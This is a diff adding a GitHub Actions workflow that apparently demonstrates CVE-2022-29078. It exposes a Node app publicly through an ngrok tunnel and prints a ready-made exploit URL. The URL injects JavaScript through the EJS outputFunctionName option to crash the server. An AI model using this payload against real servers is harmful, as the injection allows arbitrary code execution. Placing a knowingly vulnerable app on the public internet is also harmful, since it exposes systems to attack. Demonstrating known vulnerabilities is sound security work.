@@ -1,0 +1,32 @@
+name: "Build and Run"
+
+on:
+  pull_request:
+  workflow_dispatch:
+
+jobs:
+  build-and-run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+    - uses: actions/checkout@v4
+    - name: Use Node.js
+      uses: actions/setup-node@v4
+      with:
+        node-version: lts/*
+    - name: NPM install
+      run: npm install --no-audit
+    - name: Start Application
+      run: |
+        wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
+        tar xzf ngrok-v3-stable-linux-amd64.tgz
+        ./ngrok config add-authtoken ${{ secrets.NGROK_TOKEN }}
+        ./ngrok http --url=overcovetous-cementless-annette.ngrok-free.dev 3001 &
+        sleep 3
+        echo "App:     https://overcovetous-cementless-annette.ngrok-free.dev"
+        echo ""
+        echo "Normal:  https://overcovetous-cementless-annette.ngrok-free.dev/?name=alice"
+        echo "Exploit: https://overcovetous-cementless-annette.ngrok-free.dev/?name=Hacker&settings[view%20options][outputFunctionName]=x;setTimeout(function()%7Bprocess.exit(1)%7D,3000);s"
+        echo ""
+        echo "Paste the exploit URL in the browser to test CVE-2022-29078"
+        npm run start
